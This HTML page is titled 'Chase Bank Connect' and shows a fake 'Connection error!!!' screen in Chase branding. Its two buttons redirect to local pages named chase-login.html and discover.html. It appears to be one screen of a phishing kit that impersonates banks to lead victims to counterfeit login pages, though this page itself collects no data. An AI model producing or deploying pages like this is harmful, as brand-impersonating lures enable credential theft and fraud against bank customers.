<html lang="en">
 <head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Chase Bank Connect</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
 </head>
 <body class="bg-gray-900 text-white">
    <div class="max-w-md mx-auto p-4 text-center">
       <div class="mb-4">
          <i class="fas fa-exclamation-circle text-6xl text-yellow-600"></i>
          <h1 class="text-2xl font-semibold mt-4">Connection error!!!</h1>
          <p class="mt-2">Please try again later or contact customer care support if the problem continues.</p>
       </div>
       <div class="mt-4 flex justify-center space-x-4">
          <button onclick="confirmConnect()" class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">Contact support</button>
          <button onclick="cancelConnect()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded">Try again</button>
       </div>
    </div>
    <script>
       function confirmConnect() {
          // Proceed with connecting the Chase account
          window.location.href = "discover.html"; // Replace with your actual URL or logic
       }
       function cancelConnect() {
          // Cancel action, e.g., navigate back or refresh the page
          window.location.href = "chase-login.html"; // Replace with your actual logic if needed
       }
    </script>
 </body>
</html>
